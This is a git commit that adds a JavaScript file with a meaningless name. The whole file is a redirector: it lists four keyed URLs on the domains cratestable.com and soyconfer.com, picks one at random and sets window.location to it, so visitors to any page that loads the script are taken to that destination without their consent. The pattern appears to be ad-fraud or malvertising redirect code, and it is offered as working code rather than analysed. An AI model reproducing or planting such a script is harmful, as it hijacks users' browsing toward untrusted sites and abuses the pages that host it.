cff2069f734dc129d78c5839882751e0f7cd929c
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2026-02-28 01:05:40 +0700

    Create akeadstminggugbnggg.js

---
+++ akeadstminggugbnggg.js
@@ -0,0 +1,10 @@
+var dataUrl = [
+
+'https://cratestable.com/syp0z5brj?key=8f30758f2316816fbcca72577c0b0790',
+'https://soyconfer.com/syp0z5brj?key=8f30758f2316816fbcca72577c0b0790',
+'https://soyconfer.com/syp0z5brj?key=8f30758f2316816fbcca72577c0b0790',
+'https://soyconfer.com/h6gi5st6?key=dda20eb8d66854fa98f5a5e139844ac6'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
